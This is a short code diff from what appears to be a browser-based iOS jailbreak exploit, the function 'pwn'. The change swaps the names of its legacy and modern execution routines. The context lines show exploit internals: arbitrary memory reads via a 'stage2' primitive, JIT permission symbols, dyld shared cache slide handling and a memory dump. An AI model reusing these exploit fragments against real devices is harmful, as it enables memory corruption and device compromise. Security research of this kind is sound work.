@@ -438,7 +438,7 @@ var pwn = function() {
         + '\nuseFastPermisionsJITCopy @ ' + b2hex(useFastPermisionsJITCopy)
     );
 
-    function legacy_execution() {
+    function modern_execution() {
         alert('Legacy iPhones (< iPhone 8) can not be jailbroken yet.');
         if(CONFIG.MEMORYDUMP_ENABLED) print('Memory Dump Result: \n'+memorydump(dyld_shared_cache_base + slide, CONFIG.MEMDUMP_SIZE, stage2));
         var callback_vector = stage2.read64(callbacks);
@@ -501,7 +501,7 @@ var pwn = function() {
         wrapper.addEventListener('click', function(){});
     }
 
-    function modern_execution() {
+    function legacy_execution() {
         
         var callback_vector = stage2.read64(callbacks);
         var poison = stage2.read64(g_typedArrayPoisons + 6*8);
